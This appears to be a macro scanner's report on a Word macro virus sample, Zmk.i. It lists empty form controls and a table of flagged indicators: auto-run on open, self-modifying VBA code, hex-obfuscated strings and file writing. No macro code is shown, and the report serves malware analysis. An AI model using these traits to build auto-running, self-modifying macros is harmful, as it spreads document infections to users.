- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileSA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox1'" IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileSA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileSA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton2'" IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileSA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton3'" IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileSA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton4'" IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileSA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ScrollBar1'" IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileSA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileSA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox2'" IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileSA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileSA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox3'" IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileSA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'ListBox1'" IN 'Virus.MSWord.Zmk.i-8856e37100a698c64a70d07260681f691272cd8c' - OLE stream: 'Macros/FileSA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |CommandButton2_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |User32.dll          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

